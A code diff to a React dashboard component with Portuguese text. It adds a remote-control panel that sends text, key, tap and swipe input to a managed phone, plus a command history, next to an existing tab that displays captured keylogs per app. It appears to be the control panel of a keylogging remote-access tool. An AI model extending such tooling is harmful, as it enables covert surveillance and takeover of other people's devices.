@@ -26,6 +26,13 @@ export default function DeviceDetails({
   const [lockPassword, setLockPassword] = useState<string>("");
   const [lockReason, setLockReason] = useState<string>("Dispositivo travado pelo administrador");
   const [isLocking, setIsLocking] = useState(false);
+  
+  // ✅ NOVO: Estados para Controle Remoto
+  const [remoteInputText, setRemoteInputText] = useState<string>("");
+  const [remoteInputType, setRemoteInputType] = useState<"text" | "key" | "tap" | "swipe">("text");
+  const [isSendingCommand, setIsSendingCommand] = useState(false);
+  const [remoteCommandHistory, setRemoteCommandHistory] = useState<any[]>([]);
+  
   const { toast } = useToast();
 
   // Fetch keylogs from backend
@@ -43,6 +50,12 @@ export default function DeviceDetails({
   const { data: screenLockStatus, refetch: refetchLockStatus } = trpc.screenLockAdvanced.status.useQuery(
     { deviceId },
     { refetchInterval: 3000 } // Atualizar a cada 3 segundos
+  );
+
+  // ✅ NOVO: Fetch remote control history
+  const { data: remoteHistory = [], refetch: refetchRemoteHistory } = trpc.remoteControl.history.useQuery(
+    { deviceId: parseInt(deviceId), limit: 50 },
+    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
   );
 
   // Mutations
@@ -96,6 +109,26 @@ export default function DeviceDetails({
       toast({
         title: "❌ Erro",
         description: `Erro ao desbloquear: ${error.message}`,
+        variant: "destructive",
+      });
+    },
+  });
+
+  // ✅ NOVO: Mutation para enviar comando remoto
+  const sendRemoteCommandMutation = trpc.remoteControl.sendInput.useMutation({
+    onSuccess: (data) => {
+      toast({
+        title: "✅ Comando Enviado",
+        description: `Comando ${remoteInputType} enviado com sucesso!`,
+        variant: "default",
+      });
+      setRemoteInputText("");
+      refetchRemoteHistory();
+    },
+    onError: (error) => {
+      toast({
+        title: "❌ Erro",
+        description: `Erro ao enviar comando: ${error.message}`,
         variant: "destructive",
       });
     },
@@ -157,6 +190,41 @@ export default function DeviceDetails({
       console.error("Erro ao destravar:", error);
     } finally {
       setIsLocking(false);
+    }
+  };
+
+  // ✅ NOVO: Enviar comando remoto
+  const handleSendRemoteCommand = async () => {
+    if (!remoteInputText.trim()) {
+      toast({
+        title: "⚠️ Aviso",
+        description: "Digite algo para enviar",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (isSendingCommand) return;
+
+    setIsSendingCommand(true);
+    try {
+      await sendRemoteCommandMutation.mutateAsync({
+        deviceId: parseInt(deviceId),
+        inputType: remoteInputType,
+        value: remoteInputText,
+      });
+    } catch (error) {
+      console.error("Erro ao enviar comando:", error);
+    } finally {
+      setIsSendingCommand(false);
+    }
+  };
+
+  // ✅ NOVO: Enviar comando com Enter
+  const handleKeyPress = (e: React.KeyboardEvent) => {
+    if (e.key === "Enter" && !e.shiftKey) {
+      e.preventDefault();
+      handleSendRemoteCommand();
     }
   };
 
@@ -267,9 +335,13 @@ export default function DeviceDetails({
         </Button>
         <Button
           onClick={handleActivateControl}
-          className="bg-blue-600 hover:bg-blue-700 text-white"
+          className={`text-white ${
+            isControlActive
+              ? "bg-green-600 hover:bg-green-700"
+              : "bg-blue-600 hover:bg-blue-700"
+          }`}
         >
-          🎮 Ativar Controle
+          🎮 {isControlActive ? "Controle Ativo" : "Ativar Controle"}
         </Button>
         <Button
           onClick={handleLockScreen}
@@ -285,6 +357,45 @@ export default function DeviceDetails({
           🗑️ Remover Dispositivo
         </Button>
       </div>
+
+      {/* ✅ NOVO: Painel de Controle Remoto */}
+      {isControlActive && (
+        <Card className="bg-slate-800 border-slate-700 p-6 border-2 border-green-500">
+          <h3 className="text-green-400 font-bold mb-4">🎮 Painel de Controle Remoto</h3>
+          <div className="space-y-4">
+            <div>
+              <label className="text-slate-300 text-sm">Tipo de Comando</label>
+              <select
+                value={remoteInputType}
+                onChange={(e) => setRemoteInputType(e.target.value as any)}
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300"
+              >
+                <option value="text">📝 Texto</option>
+                <option value="key">⌨️ Tecla</option>
+                <option value="tap">👆 Toque</option>
+                <option value="swipe">👈 Deslizar</option>
+              </select>
+            </div>
+            <div>
+              <label className="text-slate-300 text-sm">Comando</label>
+              <textarea
+                value={remoteInputText}
+                onChange={(e) => setRemoteInputText(e.target.value)}
+                onKeyPress={handleKeyPress}
+                placeholder="Digite o comando aqui... (Enter para enviar)"
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500 resize-none h-20"
+              />
+            </div>
+            <Button
+              onClick={handleSendRemoteCommand}
+              disabled={isSendingCommand || !remoteInputText.trim()}
+              className="w-full bg-green-600 hover:bg-green-700 text-white disabled:opacity-50"
+            >
+              {isSendingCommand ? "⏳ Enviando..." : "✈️ Enviar Comando"}
+            </Button>
+          </div>
+        </Card>
+      )}
 
       {/* ✅ NOVO: Configurações de Travamento */}
       {!isScreenLocked && (
@@ -317,7 +428,7 @@ export default function DeviceDetails({
 
       {/* Tabs */}
       <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
-        <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
+        <TabsList className="grid w-full grid-cols-6 bg-slate-900 border border-slate-700">
           <TabsTrigger
             value="info"
             className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
@@ -341,6 +452,12 @@ export default function DeviceDetails({
             className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
           >
             ⌨️ Keylogs
+          </TabsTrigger>
+          <TabsTrigger
+            value="remote"
+            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
+          >
+            🎮 Controle
           </TabsTrigger>
           <TabsTrigger
             value="history"
@@ -502,6 +619,35 @@ export default function DeviceDetails({
                         <span className="text-cyan-400">{log.appName}</span>: {log.keyText}
                       </p>
                       <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </Card>
+        </TabsContent>
+
+        {/* ✅ NOVO: Aba: Controle Remoto */}
+        <TabsContent value="remote" className="space-y-4">
+          <Card className="bg-slate-800 border-slate-700 p-6">
+            <h3 className="text-cyan-400 font-bold mb-4">🎮 Histórico de Comandos Remotos ({remoteHistory.length})</h3>
+            {remoteHistory.length === 0 ? (
+              <p className="text-slate-400 text-center py-8">Nenhum comando enviado</p>
+            ) : (
+              <div className="space-y-2 max-h-96 overflow-y-auto">
+                {remoteHistory.map((cmd, idx) => (
+                  <div
+                    key={idx}
+                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-green-500 transition"
+                  >
+                    <div className="flex-1">
+                      <p className="text-slate-300">
+                        <span className="text-green-400">{cmd.inputType}</span>: {cmd.value}
+                      </p>
+                      <p className="text-slate-500 text-xs">
+                        Status: <span className={cmd.status === "completed" ? "text-green-400" : "text-yellow-400"}>{cmd.status}</span>
+                      </p>
+                      <p className="text-slate-500 text-xs">{formatTime(cmd.createdAt)}</p>
                     </div>
                   </div>
                 ))}
